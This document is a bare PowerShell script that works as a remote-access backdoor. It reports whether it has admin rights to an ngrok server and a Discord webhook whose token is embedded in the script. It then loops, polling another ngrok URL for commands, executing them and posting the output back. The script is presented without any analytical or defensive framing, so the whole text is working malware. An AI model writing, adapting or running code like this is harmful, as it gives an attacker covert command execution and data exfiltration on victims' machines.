$webhookUri = 'https://discord.com/api/webhooks/1215498255593639996/9XYdMB4oJjrL1gyLZM1KLJK0BuQLkMQVk7CCNA0d6hcurPmMHo-spwPpdDyoZycb0Gah'

$ran = Get-Random

$c = $null

$body = $null

$notification = "all data image related will be sent here"

$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -eq $False){
	$check = "we are not admin"
}else{
	$check = "we are admin"
}

try 
{
    $welcomeclient = Invoke-WebRequest -Method Post -URI https://404611374.ngrok.io -Body $hmal,$testadmin,$check,$userid,$ran -UseBasicParsing
}
catch
{

    Write-Output "Server isnt active."
}

$cb = $check,$ran,$notification

foreach ($item in $cb) {
    $body += "$item`n"
	}

$jsonBody = @{
    'username' = $ran
    'content' = $body
}

	$jsonBody = $jsonBody | ConvertTo-Json
	Invoke-RestMethod -Uri $webhookUri -Method 'post' -ContentType 'application/json' -Body $jsonBody

while ($true)
{


	$MAIN = Invoke-WebRequest -Timeout 1 'https://serverhttp.ngrok.io' | Select-Object -Expand Content

	if($MAIN -match $ran){
		$REM = $MAIN -replace $ran, ""

		$EXE = powershell /c $REM
        try
        { 
            $Response = Invoke-WebRequest -Method Post -URI https://404611374.ngrok.io -Body $EXE -UseBasicParsing 
        }
        catch{
        	$null
        }
    }
sleep 0.5
}
